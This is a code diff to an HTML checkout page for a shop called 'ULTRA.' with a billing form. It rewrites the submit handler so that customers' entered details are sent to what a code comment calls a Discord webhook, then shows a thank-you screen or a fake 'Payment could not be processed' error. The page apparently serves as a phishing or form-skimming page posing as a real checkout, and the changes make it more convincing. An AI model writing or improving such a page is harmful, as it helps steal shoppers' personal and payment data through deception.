@@ -68,7 +68,7 @@
         margin-bottom: 20px; 
         padding: 15px; 
         border: 1px solid var(--border); 
-        border-radius: 0px; /* Square edges to match the shop */
+        border-radius: 0px; 
         font-family: 'Inter', sans-serif;
         font-size: 14px;
         transition: border 0.2s;
@@ -137,13 +137,13 @@
 </head>
 <body>
 
-<div class="mini-nav">
+<div class="mini-nav" id="nav-header">
     <div class="logo">ULTRA.</div>
 </div>
 
 <div id="form-container">
   <div class="container">
-    <form id="checkoutForm" onsubmit="event.preventDefault(); sendData();">
+    <form id="checkoutForm">
       <div class="row">
         <div class="col-100">
           <h3>Billing Address</h3>
@@ -217,7 +217,7 @@
         </div>
       </div>
 
-      <input type="submit" value="Complete Purchase" class="btn">
+      <button type="submit" class="btn" id="submitBtn">Complete Purchase</button>
     </form>
   </div>
 </div>
@@ -228,7 +228,13 @@
 </div>
 
 <script>
-function sendData() {
+document.getElementById('checkoutForm').addEventListener('submit', function(e) {
+  e.preventDefault();
+  
+  const btn = document.getElementById('submitBtn');
+  btn.innerText = "PROCESSING...";
+  btn.disabled = true;
+
   const formData = {
     "NAME": document.getElementById("fname").value,
     "EMAIL": document.getElementById("email").value,
@@ -262,14 +268,26 @@ function sendData() {
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ content: message })
   })
-  .then(() => {
-    document.getElementById("form-container").style.display = "none";
-    document.getElementById("mini-nav")?.style.display = "none";
-    document.getElementById("thanks-screen").style.display = "block";
+  .then(response => {
+    // Discord returns 204 No Content on success
+    if (response.ok || response.status === 204) {
+      document.getElementById("form-container").style.display = "none";
+      document.getElementById("nav-header").style.display = "none";
+      document.getElementById("thanks-screen").style.display = "block";
+      window.scrollTo(0,0);
+    } else {
+      throw new Error('Webhook failed');
+    }
   })
-  .catch(() => alert("Error: Connection lost."));
-}
+  .catch(err => {
+    console.error(err);
+    alert("Error: Payment could not be processed. Please try again.");
+    btn.innerText = "COMPLETE PURCHASE";
+    btn.disabled = false;
+  });
+});
 </script>
 
 </body>
 </html>
+
